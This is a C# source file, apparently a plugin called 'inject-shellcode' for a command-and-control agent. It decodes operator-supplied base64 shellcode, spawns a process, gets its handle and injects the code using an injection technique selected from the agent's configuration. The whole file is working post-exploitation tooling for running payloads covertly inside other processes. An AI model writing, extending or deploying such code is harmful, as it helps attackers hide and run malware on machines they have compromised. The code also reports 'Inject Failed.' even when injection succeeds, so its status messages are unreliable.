using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using inject_shellcode.Techniques;
using System.Text.Json;
using System.Reflection;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "inject-shellcode";
        private IMessageManager messageManager { get; set; }
        private IAgentConfig config { get; set; }
        //private ITechnique technique { get; set; }
        private ISpawner spawner { get; set; }
        private List<ITechnique> techniques = new List<ITechnique>();
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.spawner = spawner;
            this.config = config;
            GetTechniques();
            //this.technique = techniques.Where(x => x.id == config.inject).FirstOrDefault();
        }

        public async Task Execute(ServerJob job)
        {
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);

            if (!args.Validate(out var message))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);

            if (!await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
            {
                await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
                return;
            }

            if (!spawner.TryGetHandle(job.task.id, out var handle))
            {
                await messageManager.WriteLine("Failed to get handle for process", job.task.id, true);
                return;
            }

            var technique = techniques.Where(x => x.id == this.config.inject).FirstOrDefault();
            if (technique is null)
            {
                Console.WriteLine("Failed to find injection technique.");
                return;
            }

            if (!technique.Inject(buf, handle.DangerousGetHandle()))
            {
                await messageManager.WriteLine("Inject Failed.", job.task.id, true);
                return;
            }

            await messageManager.WriteLine("Inject Failed.", job.task.id, true);
            return;
        }

        private void GetTechniques()
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            foreach(Type t in asm.GetTypes())
            {
                if (!typeof(ITechnique).IsAssignableFrom(t))
                {
                    continue;
                }
                try
                {
                    ITechnique technique = (ITechnique)Activator.CreateInstance(t);

                    if (technique is not null)
                    {
                        techniques.Add(technique);
                    }
                }
                catch
                {
                    continue;
                }
            }
        }
    }
}
